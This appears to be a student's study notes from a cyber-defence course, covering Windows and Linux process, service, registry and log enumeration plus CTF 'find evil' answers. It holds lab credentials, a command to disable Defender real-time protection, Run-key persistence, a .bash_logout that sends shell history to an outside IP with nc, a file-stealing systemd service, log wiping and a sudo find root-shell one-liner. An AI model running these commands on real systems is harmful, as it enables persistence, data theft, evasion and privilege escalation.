# OS (Focuss on persistence).
```

10.50.26.35 (IP for number 71) 
10.50.22.197:8000 (Website for challenges)
xfreerdp /u:student /v:10.50.26.35 -dynamic-resolution +glyph-cache +clipboard
for ssh from xfreerdp use your stack number to ssh into the machine 10.XX.0.(0-7) (1.Domain Controller, 3.File Server, 4.Workstation 2, 5.Workstation 1, 6.Terra, 7.Minas Tirith)
credentials 1,3,4 andy.dwyer-BurtMacklinFBI (SSH-Connection)
credentials 5 student-password
credentials 6 garviel-luna
credentials 7 bombadil-jolly

ssh -J student@10.50.26.35 Andy.Dwyer@10.17.0.1
xfreerdp /u:student /v:10.50.26.35 -dynamic-resolution +glyph-cache +clipboard
(Windows GUI), password-password





```
# POWERSHELL
### Pwershell profiles are good to set persistence. Profiles are just scripts that have configurations set.
```
PowerShell supports several profile files and host programs, like Windows, support their own specific profiles. The profiles below are listed in order of precedence with the first profile having the highest precedence.


Description	                              Path
All Users, All Hosts                      $PsHome\Profile.ps1                                       *From more persistence to less persistence 
All Users, Current Host                   $PsHome\Microsoft.PowerShell_profile.ps1
Current User, All Hosts                   Home\[My]Documents\Profile.ps1
Current User, Current Host                $Home\[My ]Documents\WindowsPowerShell\Profile.ps1


In addition, other programs that host PowerShell can support their own profiles. For example, PowerShell Integrated Scripting Environment (ISE) supports the following host-specific profiles.



All users, Current Host                   $PsHome\Microsoft.PowerShellISE_profile.ps1
Current user, Current Host                $Home\[My]Documents\WindowsPowerShell\Microsoft.PowerShellISE_profile.ps1
```

### How to get the count for a specific text pattern in a file:
```
(select-string -pattern "aa[a-g]" C:\Users\CTF\Desktop\CTF\words.txt).count
```
or 

```
(select-string -pattern "aa[a-g]" C:\Users\CTF\Desktop\CTF\words.txt) | Measure-Object
```
### How to unzip a file manually 
```
Expand-Archive C:\Users\CTF\Documents\Omega1000.zip -DestinationPath C:\Users\CTF\Documents\Omega2000
```
It will create a ZIP file (Omega999.zip) within Omega2000

### Create a loop that will unzip a zip file 1000 times.
```
$a = 1000
do { $a--
 expand-archive C:\Users\CTF\Documents\Omega1000\Omega$a.zip C:\Users\CTF\Documents\Omega1000\ -force
 } until ($a -eq 0)
```
 for unziping the file properly the origin and destination files must be the same 

### Get the number of lines in the file 'words.txt' that match the pattern az 
```
get-content 'words.txt' | select-string -pattern az | measure-object -line
```

## To find the Security Identifier (SID) of users using PowerShell, you can execute the following command:
```

Get-WmiObject Win32_UserAccount | Select-Object Name, SID

```
This command will list all user accounts on your system along with their corresponding SIDs1. If you want to find the SID of a specific user, replace 'username' with the actual username in the command:

```
Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.Name -eq 'username' } | Select-Object SID
```

Additionally, if you’re interested in counting the number of users belonging to an Active Directory group, you can use the following PowerShell command:
```
Import-Module ActiveDirectory
(Get-ADGroupMember -Identity "domain users").Count
```
 You create a registry key to establish persistence, to set an accion based on automatization.
 
Creating Registry objects with Powershell
```
New-Item - Creates a new sub key associated within a hive
```
```
New-Item "HKLM:\Software\Microsoft\Office\14.0\Security\Trusted Documents\TrustRecords" -Force
```
Creates a new sub key in Trusted Documents for document.doc
```
New-ItemProperty "HKLM:\Software\Microsoft\Office\14.0\Security\Trusted Documents\TrustRecords" -Name "%USERPROFILE%Downloads/test-document.doc" -PropertyType Binary -Value ([byte[]](0x30,0x31,0xFF)) 
```
```
New-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name Test -PropertyType String -Value C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
```
Creates a new value in the \TrustRecords key
Creates a value in the \Run key
Outside of the scope of the class but in case you want to know more about that byte array


Modifying Registry objects with PowerShell
```
Rename-ItemProperty - Modifies a value associated with a sub key
```
```
Rename-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name SecurityHealth -NewName Test
```
```
Remove-ItemProperty - Removes a value associated with a sub key
```
```
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Office\14.0\Security\Trusted Documents\TrustRecords" -Name "%USERPROFILE%Downloads/test-document.doc"
```
```
Set-ItemProperty - Change the value of a sub key
```
```
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name Test -Value Bacon.exe
```
Disable Windows Defender Real Time Protection
```
Set-MpPreference -DisableRealtimeMonitoring $TRUE
```
Sometimes, the previous command may not work as expected. In such cases, you can follow these steps:
Click the Windows button in the lower-left corner of your desktop.
Navigate to "Virus & threat protection."
Under "Virus & threat protection settings," click "Manage settings."
Finally, toggle off "Real-Time protection." These steps will help you turn off real-time protection using the Windows Security interface.

Wireless network connections (suspicious)
```
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles'
```
# LINUX/UNIX

Linux
SYSV (look for scripts)
/lib/systemd/systemd or /sbin/init

/etc/init, /etc/inittab, /etc/rc*.d (* is run level) (SYSV)ls -l (/etc/rc3.d/)

SYSD (look for wants and requires)
ls -lisa /lib/systemd/system/default.target (SYSD)

/etc/systemd/system/*

/lib/systemd/system/*

/run/systemd/generator/*

cat /etc/systemd/system/display-manager.service | tail -n 13

cat /etc/environment

cat /etc/profile

cat /etc/profile.d (look for scripts [.sh])

cat /etc/bash.bashrc

$HOME/.bash_profile and $HOME/.bashrc

Without chmoding a dir if we have w and r permissions we can ls -lisa the dir to see what contents are inside the dir.

## Sticky bit.
Only the owner of that file can delete that file.
If on the user part of the permisions there is an s that indicates that you are going to run that program as the only user for that program.
When an executable is ran in Linux, it runs with the permissions of the user who started it. However, SUID and SGID change that to force the executable to run as the owning user or group. These permissions are represented as s in the User or Group field of ls- l.

## Grep:
```
ls -Rlisa /etc | grep password 
```
1137 4 -rw-r--r--   1 root root 1440 Jan 31  2020 common-password
1156 4 -rw-r--r--   1 root root 1160 Oct  9  2018 gdm-password
```
grep -R 'network' /etc/ 
```
Execute grep -R 'network' /etc/ then send it’s standard out to grep to filter for the string network.
The -R is recursive.



## Linux Boot Process:

The file /home/bombadil/mbroken is a copy of an MBR from another machine.

Hash the first partition of the file using md5sum. The flag is the hash.

```
dd if=/home/bombadil/mbroken bs=1  count=446 | md5sum  #bs=byte syze, count=number of bits to take 
```

-The file /home/bombadil/mbroken is a copy of an MBR from another machine.
You will find the "word" GRUB in the output, hash using md5sum.
The flag is the entire hash.

```
dd if=/home/bombadil/mbroken bs=1 skip=392 count=4| md5sum #skip= number of bytes to skip
```

## Windows Process Validity FG


What is a process?

A program running on your computer, whether executed by the user or running in the background.

Examples include:

Background tasks like spell checker

Executables like Google Chrome and Notepad



What is a DLL?

Dynamic Link Library

A non-standalone program that can be run by (linked to) multiple programs at the same time.

Cannot be directly executed. Dependent on an exe to use as an entry point, such as RUNDLL.EXE (a process that calls on the functionality of the DLL)

Allows developers to make minor changes without affecting other parts of the program.

Some Examples Include:

Comdlg32 - Performs common dialog box related functions.

Device drivers

ActiveX Controls




## View all Processes, not sorted.
```
Get-Process
```

## View all Processes, sort them by PID.
```
Get-Process | Sort -Property Id | more
```
## View only the processes I define and sort by PID
```
Get-Process SMSS,CSRSS,LSASS | Sort -Property Id
```

## View modules/DLLs used by defined process and their file locations.

```
Get-Process chrome | foreach {$_.modules} | more
```
```
Get-Process -Name "*chrome*" | Select-Object -ExpandProperty Modules | more
```
## View only modules/DLLs used by Chrome with "chrome" in the name and their file locations.
```
Get-Process chrome | foreach {$_.modules} | Where-Object ModuleName -like '*chrome*' | more
```
```
Get-Process -Name "*chrome*" | Select-Object -ExpandProperty Modules | Where-Object ModuleName -like '*chrome*' | more
```
Pipe in a ft -wrap to see full file name/path.

#PS C:\Users\student> Get-Process chrome | foreach {$_.modules} | Where-Object ModuleName -like '\*chrome*' | more

## Use the Get-Ciminstance Win32_Process cmdlet to veiw processes with PPID

### View Process instances with Win32 process.
```
Get-Ciminstance Win32_Process
```
### View the additional Properties with Get-Member

#C:\WINDOWS\system32>  Get-CimInstance Win32_Process | Get-Member

### View the processes with PID and PPID sorted by PID

#C:\WINDOWS\system32>  Get-CimInstance Win32_Process | select name,ProcessId,ParentProcessId | sort processid

### View an instance of all Win32 (system) services.
```
Get-Ciminstance Win32_service | Select Name, Processid, Pathname | more
```
Pipe in ft -wrap to see full file name/path

#PS C:\Users\student> Get-Ciminstance Win32_service | Select Name, Processid, Pathname | ft -wrap | more

View all processes
```
tasklist
```
#C:\Users\student> tasklist | more

### Display verbose task information in the output
```
tasklist /v
```
#C:\Users\student> tasklist /v | more

### Display service information for each process without truncation
```
tasklist /svc
```
#C:\Users\student> tasklist /svc

### Display modules/dlls associated to all processes.
```
tasklist /m | more
```
#C:\Users\student> tasklist /m | more

### Display modules/dlls associated to a specific process.
```
tasklist /m /fi "IMAGENAME eq chrome.exe"
```
#C:\Users\student> tasklist /m /fi "IMAGENAME eq chrome.exe" | more

### Formating options
```
tasklist /fo:{table|list|csv}`
```
#C:\Users\student> tasklist /fo:table | more

#C:\Users\student> tasklist /fo:list | more

#C:\Users\student> tasklist /fo:csv | more

### Filtering for specific string/process
```
tasklist /fi "IMAGENAME eq lsass.exe"
```
#C:\Users\student>tasklist /fi "IMAGENAME eq lsass.exe

## View Processes in the GUI
Task Manager

Microsoft Default

Procexp.exe

We’ll go over it in Sysinternal Tools Lesson

How to View Services


Q: Which Windows commands let us view information on services?

In Powershell:
```
Get-Ciminstance #Microsoft Reference
```
```
Get-Service #Microsoft Reference
```
In Command Prompt:
```
net start #Shows currently running services
```
```
sc query #Microsoft Reference
```
### View only system services and display Name, PID, and the path they are initiated from.
```
Get-Ciminstance Win32_service | Select Name, Processid, Pathname | more
```
Pipe in a ft -wrap to see full pathname.

#PS C:\Users\student> Get-Ciminstance Win32_service | Select Name, Processid, Pathname | more

### View all services.
```
Get-service
```
#PS C:\Users\student> get-service | more

### View a defined service, showing all properties in list format.
```
get-service ALG | format-list *
```
#PS C:\Users\student> get-service ALG | format-list *

### View only currently running services.
```
Get-Service | Where-Object {$_.Status -eq "Running"}
```
#PS C:\Users\student> Get-Service | Where-Object {$_.Status -eq "Running"} | more

## View Services in Command Prompt


### View Services
```
sc query
```
#C:\Users\student>sc query | more

### View extended information for all services.
```
sc queryex type=service
```
#C:\Users\student>sc queryex type=service | more

### View extended information for all inactive services.
```
sc queryex type=service state=inactive
```
#C:\Users\student>sc queryex type=service state=inactive | more

### View all currently running services.
```
net start
```
#C:\Users\student>net start | more

## How to view Scheduled tasks


### View Scheduled Tasks In PowerShell


### View all properties of the first scheduled task.
```
Get-ScheduledTask | Select * | select -First 1
```
#PS C:\Users\student> Get-ScheduledTask | Select * | select -First 1

### View Scheduled Tasks In Command Prompt
```
schtasks /query /tn "IchBinBosh" /v /fo list
```
Autorun Registry Locations

What are some Registry keys that can be used for autoruns?

Registry Keys Locations, Locations connected with Services.

HKLM\Software\Microsoft\Windows\CurrentVersion\Run - Local Machine

HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

HKLM\System\CurrentControlSet\Services

Remember that the Users have individual Hives with autoruns as well as the Current User.

HKCU\Software\Microsoft\Windows\CurrentVersion\Run - Current User

HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

HKU\<sid>\Software\Microsoft\Windows\CurrentVersion\Run - Specific User

HKU\<sid>\Software\Microsoft\Windows\CurrentVersion\RunOnce

The order in which services are loaded can be adjusted.

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ServiceGroupOrder

HKEY_LOCAL_MACHINE\CurrentControlSet\Control\GroupOrderList

## View Network Connections In PowerShell


### Show all Connections in the "Established" state.
```
Get-NetTCPConnection -State Established
```
#PS C:\Users\andy.dwyer> Get-NetTCPConnection -State Established

### View Network Connections in Command Prompt
### Show netstat help and point out the following:
```
netstat /?
```
-a   Displays all connections and listening ports
-n   Displays addresses and port numbers in numerical form
-o   Displays the owning process ID (PID) associated with each connection
-b   Displays the executable involved in creating each connection (must have admin rights)

## Displays all TCP/UDP connections with ports in numerical form with PID and executable associated to the connections
```
netstat -anob | more
```
#andy.dwyer@ADMIN-STATION C:\Users\andy.dwyer>netstat -anob | more

# CTF-DAY6

### What is the full path to folder used when Windows redirects 32 bit applications running on a 64bit system?
-C:\Windows\SysWOW64

### What Windows System Service starts the kernel and user mode subsystems?
-smss.exe


### What Windows system process:
Runs in session 0
is responsible for enforcing the security policy on the system
Performs all logon functions
Handles password changes
Creates access tokens
Writes to the Windows Security Log
-LSASS


### Which service type is explorer.exe?
-User-mode service

### During a network survey you observed a host running inetinfo.exe service. What type of server might you have found?
-IIS *(If you observed a host running inetinfo.exe service, it likely indicates that the host is running a Microsoft Internet Information Services (IIS) server.)

### During a reconnaissance mission you enumerated a host running the dns.exe service. Is this a user pc or a server?
-Server *(If you encountered a host running the dns.exe service, it's more likely to be a server)

### A host running firefox and office 365 is most likely what type of host? Server or Client
-Client

### How does a User-Mode Service request resources?
-Sytem calls *(User-mode services request resources through system calls to the operating system kernel.)

### Passively copying currently running processes for comparison later is known as?
-Baselining

### What can execute any part of a processes code, to include parts already being executed?
-Thread

### Windows has how many process priority levels?
-32 *(0-31)

### What Sysinternals tool shows malware persistence locations in tabs within its GUI?
-Autoruns

### What Sysinternals tool is used to investigate processes?
-Process Explorer

### What Sysinternals tool can be used to investigate network connection attempts?
-TCPView

### What Sysinternals tool can view permissions?
-AccessChk

### What Sysinternals tool allows us to view and modify handles?
-Handle

### What is the default Windows user directory for files downloaded from the internet? The flag is the folder name only.
-Downloads

### What is the default Windows download directory that everyone has access to? The flag is the absolute path to the directory.
-C:\Users\Public\Downloads

### What Sysinternals tool shows service load order?
-LoadOrder

### What is the service name of Windows Defender Firewall?
-mpssvc

### What SysInternals tool reports .dlls loaded into processes?
-ListDLLs


### There is malware on the system that is named similarly to a legitimate Windows executable. There is a .dll in the folder that the malware runs from. The flag is the name of the .dll.
-cd C:\Documents and Settings\Public\Downloads
dir
check for mispelling errors
DLL above suspicious .exe

### You notice that there is an annoying pop up happening regularly. Investigate the process causing it. The flag is the name of the executable.

run

```
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
```
To find the executables runing in the machine for every user
Then run 
```
Get-Process | Select-Object -Property ProcessName, Path | Format-Table -AutoSize
```
Go check the .exe that matches with the HKLM Key

### Malware uses names of legit processes to obfuscate itself. Give the flag located in Kerberos’ registry subkey.

Win+R Regedit, Ctl+F Kerberos, keep looking until flag 76aGreX5 pops up.

### A nonstandard port has been opened by possible malware on the system. Identify the port.

Machine: Workstation1 (RDP from Admin-Station)
login: student
password: password
```
netstat -ano | find "LISTENING"
```
Determine what mechanism opened the port from hidden_processes_7. The flag is the name of the file.

Hint: The file is not legit.

Machine: Workstation1 (RDP from Admin-Station)
login: student
password: password

Open process explorer ctl+f powershell go to image and command line 

What command-line (cmd) command will show all services, running or not running?
sc query

What command-line (cmd) command will show all services, running or not running?
sc queryex type= service state= all

What PowerShell command will list all services?
Get-Service


Get-Service | Where-Object { $_.DisplayName -eq "Totally-Legit" } | Select-Object Name, DisplayName

Identify the file that contains udp connection information. Identify the process using port 123.

For the flag, enter:

Process name
File descriptor number for the udp socket
Its permissions as shown in lsof
ChatGPT
To identify the file that contains UDP connection information and the process using port 123, you can use the lsof command. Here's how you can do it:

Identify the file containing UDP connection information for port 123:

sh
Copy code
```
sudo lsof -i UDP:123
```
Record the process name, file descriptor number for the UDP socket, and its permissions:

The output of the lsof command will display the process name, file descriptor number, and permissions for the UDP socket associated with port 123.
Flag Format:

￼Copy code
ProcessName FileDescriptorNumber PermissionsShownInLsof
Replace ProcessName, FileDescriptorNumber, and PermissionsShownInLsof with the actual values obtained from the lsof command.

For example, if the process name is example_process, the file descriptor number is 5, and the permissions shown in lsof are rw, the flag would be:

￼Copy code
example_process 5 rw




To locate a strange open port on a SysV system, you can use the netstat command to list all open ports and then inspect the list for any unusual or unexpected ports. Here's how you can do it:

Open a terminal on your SysV system.

Run the following command to list all open ports:

￼Copy code
netstat -tuln

# FIND EVIL 1



Scenario: The Villains group has been chanting offerings to their new leader at regular intervals over a TCP connection.

Task: Identify their method of communication and how it is occurring. Locate the following artifacts: ** The chant/text used by each villain (include spaces) ** The new Lord receiving the offering ** The IP address and port that the offering is received over

Flag format: chant text,new Lord,IP:port

Machine: Minas_Tirith




htop to find the suspicious user receiving the chants
```
cat /home/ * /offering
```
```
cat /home/ * /chant
```


# FIND EVIL 2

Scenario: Text files are being exfiltrated from the machine using a network connection. The connections still occur post-reboot, according to network analysts.

The junior analysts are having a hard time with attribution because no strange programs or ports are running, and the connection seems to only occur in 60-second intervals, every 15 minutes.

Task: Determine the means of persistence used by the program, and the port used. The flag is the command that allows exfiltration, and the file its persistence mechanism uses.

Flag format: command,persistence

Machine: Terra
```
systemctl list-timers
```
```
cat whatischaos.timer 
```
```
cat whatischaos.service
```
# FIND EVIL 3

Scenario: The web server has been modified by an unknown hacktivist group. Users accessing the web server are reporting crashes and insane disk usage.

Task: Identify the Cyber Attack Method used by the group, and the command running.

Flag format: AttackMethod,command

Machine: Terra

Try not to break your machine on this one...
```
ps -elf |  grep apache3
```


Scenario: Someone or something is stealing files with a .txt extension from user directories. Determine how these thefts are occurring.

Task: Identify the command being ran and how it occurs.

Flag format: command,how it occurs

Machine: Terra

Hint: Explore persistence mechanisms and services.
```
grep -Rnw / -e "*.txt" 2>/dev/null
```
garviel@terra:~$ cat /etc/systemd/system/graphical.target.wants/passwd.service #the way that it happens is my passwd.service
Description=Secrets
After=network.target auditd.service

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'find /home -name \*.txt -exec cp {} /tmp \;' #command, pay attention to arguments
Restart=no

[Install]
WantedBy=multi-user.target
Alias=vestrisecreta.service

# FIND EVIL 5

Scenario: Analysts have found a dump of commands on the Internet that refer to the Terra machine. The command history for one of the users with an interactive login is being stolen via unknown means. The network analysts can’t find any persistent connections, but notice a spike in traffic on logon and logoff.

Task: Identify how the command history is stolen from the machine.

The flag is the file used to execute the commands, and where they are sent.

Flag format: /absolute/path/to/file,IP:port

Machine: Terra


cat .bash_logout

pwd

garviel@terra:~$ cat .bash_logout
 ~/.bash_logout: executed by bash(1) when login shell exits.

 when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
history -w /tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2
nc -w2 12.54.37.8 12000 < /tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2
garviel@terra:~$ pwd 
/home/garviel #add /.bash_logout











### Command line to show hidden files on windows:
```
dir /a:h
```
```
dir /a:h /s 
```
*(With Subdirectories)

```
findstr "example"
```
Will find a the string example in current dir

```
findstr "example" C:\Users\Username\Documents\*
```
Will find a the string example in specified path 

```
findstr "example" C:\Users\Username\Documents\* /S
```
Will find a the string example in specified path with subdirectories checked for matching too.

```
netstat -ano 
```
```
netstat -anp
```
Enumerate all DLLs
```
dir C:\Windows\System32\*.dll
```
```
dir C:\ /s /b /a:-d /a:-h /a:-s /a:-r *.exe
```
Explanation of parameters used:

/s: Recursively search all subdirectories.
/b: Bare format (displays only the file path).
/a:-d: Excludes directories from the output.
/a:-h: Excludes hidden files from the output.
/a:-s: Excludes system files from the output.
/a:-r: Excludes read-only files from the output.
*.exe: Filters the results to show only files with a .exe extension.

Using PowerShell:
```
Get-ChildItem -Path C:\ -Recurse -File -Filter *.exe | Select-Object -ExpandProperty FullName
```
Malware authors often target specific folders and directories on Windows systems where they can install their malicious payloads to maximize the chances of infiltration and persistence. Here are some of the most common locations where malware may be installed:

System Folders:

System32: This folder contains critical system files. Malware may camouflage itself by using names similar to legitimate files or by directly replacing system files.
SysWOW64: Similar to System32, but for 32-bit applications on 64-bit Windows systems.
Windows: The Windows directory contains essential system files. Malware may create subdirectories or hide within existing ones to evade detection.
User Profile Folders:

AppData: This folder, located within each user's profile directory (C:\Users\username\AppData), is a common location for malware as it provides a convenient place to hide executables and configurations. Specifically, the "Roaming" and "Local" subfolders are often targeted.
Startup: Malware may place executables or shortcuts in the Startup folder (C:\Users\username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup), ensuring persistence by running on system startup.
Temporary Directories:

Temp: The Windows Temp directory (C:\Windows\Temp) or user-specific Temp directories (C:\Users\username\AppData\Local\Temp) are frequently used by malware to drop temporary files or extract payloads.
Program Files and Program Files (x86):

Program Files: Malware may attempt to disguise itself by installing in directories commonly used by legitimate applications (C:\Program Files).
Program Files (x86): On 64-bit systems, malware targeting 32-bit applications may install itself in this directory (C:\Program Files (x86)).
Root Directories:

Root of the System Drive (e.g., C:): Malware may drop files directly in the root directory to gain visibility and execute from a location that most users have access to.
Registry:

Run and RunOnce Keys: Malware may create or modify entries in the Windows Registry under "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" and "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" to ensure persistence by running on system startup.
Browser-related folders:

Browser Extensions and Plugins: Malware targeting web browsers may install malicious browser extensions or plugins in directories specific to the browser being used (e.g., Chrome, Firefox, Edge).
It's important to regularly monitor these locations for any suspicious activity and to keep antivirus software up to date to detect and remove malware.



## Find executables and DLLs associated to them: 

To find executables (.exe files) and the dynamic link libraries (DLLs) associated with them in the System32 directory on Windows using the command line, you can utilize the dir command. Here's how you can do it:
```
dir C:\Windows\System32\*.exe C:\Windows\System32\*.dll /s /b
```

There is a file that was recently opened that may contain PII.

Get the flag from the contents of the file.

Hint: We're not interested in numbers.
```
Get-Item 'Registry::\HKEY_USERS\*\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.txt'
```
Hive:                                                                                                                       
    \HKEY_USERS\S-1-5-21-2881336348-3190591231-4063445930-1003\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs    


Name                           Property                                                                                         
----                           --------                                                                                         
.txt                           6 : {67, 0, 58, 0...}                 #6 is the number 


[System.Text.Encoding]::Unicode.GetString((gp "REGISTRY::HKEY_USERS\*\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.txt")."6")


## Enter the name of the questionable file in the prefetch folder.
```
cd C:\Windows\Prefetch
```

## What is the creation time of the questionable file in the prefetch folder?

```
Get-ItemProperty -Path "C:\Windows\Prefetch" | Select-Object CreationTime
```

## Recover the flag from the Recycle Bin. Enter the name of the recycle bin file that contained the contents of the flag, and the contents of the deleted file. Include the file extension in your answer.

*Hint: "Don't"

Flag format: filename,contents

```
cd C:\$Recycle.bin
```
```
Get-Childitem 'C:\$RECYCLE.BIN' -Recurse -Verbose -Force | select FullName
```

```

gci C:\ -FIlter BAD_INTENTIONS.EXE-8F2806FC.pf -ErrorAction SilentlyContinue -Recurse | Select-Object CreationTIme
```




## Recover the flag from the Recycle Bin. Enter the name of the recycle bin file that contained the contents of the flag, and the contents of the deleted file. Include the file extension in your answer.

*Hint: "Don't"

Flag format: filename,contents



```
cd C:\$Recycle.Bin
```
```
gci  -recurse -force 'C:\$Recycle.Bin' | select-string "DONT" 
```



## Enter the full path of the program that was run on this computer from an abnormal location.

Keep in mind that:

 


Operating System




Windows 11

Windows 11 (22H2) 10.0.22621

Windows 11 (21H2) 10.0.22000


Windows 10

Windows 10 (22H2) 10.0.19045

Windows 10 (21H2) 10.0.19044
 
Windows 10 (21H1) 10.0.19043

Windows 10 (20H2) 10.0.19042

Windows 10 (2004) 10.0.1904

Windows 10 (1909) 10.0.18363

Windows 10 (1903) 10.0.18362

Windows 10 (1809) 10.0.17763

Windows 10 (1803) 10.0.17134

Windows 10 (1709) 10.0.16299

Windows 10 (1703) 10.0.15063

Windows 10 (1607) 10.0.14393




HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings #On 1809 and Newer

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\bam\UserSettings #On 1803 and below

```
`Get-Item HKLM:\SYSTEM\CurrentControlSet\Services\bam\UserSettings\*
```
## Check event logs for a "flag" string.

Machine: file-server

```
Get-Eventlog -LogName System | ft -wrap | findstr /i flag 
```


Find the file in the jump list location that might allow privilege escalation.

```
cd C:\Users\student\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations
```
 Directory: C:\Users\student\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations                                  


Mode                LastWriteTime         Length Name                                                                           
----                -------------         ------ ----                                                                           
-a----         6/6/2024   3:04 PM           4638 5f7b5f1e01b81337.automaticDestinations-ms                                      
-a----        2/23/2022  10:01 PM           1536 5f7b5f1e01b83767.automaticDestinations-ms                                      
-a----        2/23/2022   9:59 PM           7168 f01b4d95cf55d32a.automaticDestinations-ms

```
get-content '5f7b5f1e01b81337.automaticDestinations-ms'
```


# Removing tracks:

Log removal and timestamp changes are techniques used by attackers to cover their tracks on Linux systems after performing unauthorized activities. These activities could include gaining unauthorized access, executing malicious commands, or tampering with files.

Log Removal:

Attackers may attempt to delete or modify log files to remove evidence of their actions. Log files contain records of system events, user activity, and network traffic, providing valuable information for system administrators and security analysts.
Common log files on Linux systems include:
/var/log/auth.log: Records authentication events, including login attempts.
/var/log/syslog: General system log containing messages from various system components.
/var/log/secure: Records security-related events, such as authentication failures.
Attackers may use commands like rm or truncate to delete log files or clear their contents. For example:
bash
```
rm /var/log/auth.log
```
```
truncate -s 0 /var/log/auth.log
```

However, deleting or modifying log files may raise suspicion, as it's an abnormal behavior that could indicate an attempted cover-up.
Timestamp Changes:

In addition to removing log files, attackers may attempt to modify timestamps on files to make their activities less detectable. Timestamps provide information about when a file was created, modified, or accessed.
The touch command can be used to modify timestamps on files. For example, to change the modification time of a file to the current time:
bash
```
touch /path/to/file
```

Alternatively, attackers may modify system time using the date command to change the system clock. For example, to set the system time to a specific date and time:
bash
```
date MMDDhhmmYYYY
```

Replace MMDDhhmmYYYY with the desired date and time in the format MM (month), DD (day), hh (hour), mm (minute), and YYYY (year).
Changing timestamps can make it more difficult for investigators to establish the timeline of events and identify when suspicious activities occurred.
It's important to note that log removal and timestamp changes are considered malicious activities and are often detected during forensic analysis or system monitoring. System administrators and security teams should implement proper logging and monitoring solutions to detect and respond to such activities promptly. Additionally, maintaining backups of log files can help preserve evidence even if log files are tampered with or deleted.



## Filtering Syslog Log Files

```
cat /var/log/syslog | grep timesyncd 
```
Filtering Syslog Output With Grep
```
cat /var/log/syslog | grep -R "\w*\.\w*\.\w*
```

## Log Rotations: (Moving logs around)

A daily cron job runs the logrotate binary controls log rotations. The cron job runs logrotate with the path to its configuration file /etc/logrotate.conf as an argument. /etc/logrotate.conf defines how often logs are rotated.

If your system might not have rotated files yet. Force rotations with sudo /usr/sbin/logrotate /etc/logrotate.conf

vim and zcat will read zip files without extracting them.

## Essential Syslog Types/Locations

### Authentication

. /var/log/auth.log     Any logs having to do with logins and authentication attempts (Authentication related events)
. /var/run/utmp        (Users currently logged in .. Not in human readable format. Must use last command)
. /var/log/wtmp        History file for utmp  Not in human readable format. Must use last command) 
. */var/log/btmp       (Failed login attempts)

### Application

Any logs having to do with programs. . Apache - Webserver (dir) . apt - Package Manager (dir) . /var/log/mysql.log

### System

/var/log/messages - Legacy Catch all

/var/log/syslog - Ubuntu/Debian Catch all

dmesg = Device Messenger (queires /proc/kmsg)

Kernel Ring Buffer - Never fills

First logs generated by the system

### Logging at a Glance

Location: All logs are in /var, most are in /var/log

Config File: /etc/rsyslog.conf

Service: /usr/sbin/rsyslogd

## XML output

File: /home/garviel/output.xml

Select all of the IP addresses and ports using a single XPATH Union Statement

Pipe the result to md5sum for the flag

HINT:

https://carpentries-incubator.github.io/lc-webscraping/
http://www.tizag.com/xmlTutorial/xpathbar.php
Sample Output (without piping to MD5SUM)



 addr="xx.xxx.xx.xx"
 addr="xx.xxx.xx.xx"
 addr="xx.xxx.xx.xx"
 addr="xx.xxx.xx.xx"
 portid="xx"
 addr="10.50.29.6"
 addr="xx.xxx.xx.xx"
 portid="22"

--TRIMMED--


## Answer:
```
xpath -q -e '//address/@addr | //port/@portid' output.xml | md5sum
```


## JSON conn. log

File: /home/garviel/conn.log

Use jq to pretty print the JSON file conn.log.

Hash the pretty-printed file with md5sum for the flag.

Sample JSON "Pretty Print" Output (without piping to MD5SUM)

## Answer:
```
jq '.' /home/garviel/conn.log | md5sum
```

##JSON count ips 

File : /home/garviel/conn.log

This file is a conn.log made in Zeek (Bro) with data about TCP/IP connections.

Use jq to locate and count the unique originating endpoint IP addresses in the file. Enter the number of unique originating IP addresses as the flag.

Flag format: #

HINT: Use this link to understand the JSON object’s attributes

```
jq '.' /home/garviel/conn.log | grep id.orig_h  | sort -u | wc -l
```


find ip addresess and open ports with portid

```
//*[@state='open']/../../../address/@addr | //*[@state='open']/../../port/@portid
```
```
Get-ADUser -Identity "Xavier.Ibarra" -Properties *
```
## Output members of the group Domain Admins
```
Get-ADGroupmember -identity "Domain Admins"
```
##Output information aboput group Domain Admins
```
Get-ADGroup -identity "Domain Admins"
```
```
Get-ADUser -Filter * -Properties SamAccountname | findstr "Isiah" 
```
```
Get-ADUser -Filter "physicalDeliveryOfficeName -eq 'users pa55w0rd: SchrodingersCat!!'" -Properties StreetAddress 
```

Old privilege escalation command to access to a root terminal. 

```
sudo find /etc/passwd -exec /bin/sh \;
```



ChatGPT
Finding persistence mechanisms on a Linux system involves examining various places where processes or scripts might be configured to run automatically upon system boot or user login. Here are some common places to check:

Startup Scripts:

Check /etc/init.d/, /etc/init/, and /etc/rc.d/ for scripts executed during system startup.
Examine /etc/rc.local for commands that are run at the end of the boot process.
Cron Jobs:

Check the system-wide crontab files in /etc/crontab and the directories /etc/cron.d/, /etc/cron.daily/, /etc/cron.hourly/, /etc/cron.weekly/, and /etc/cron.monthly/.
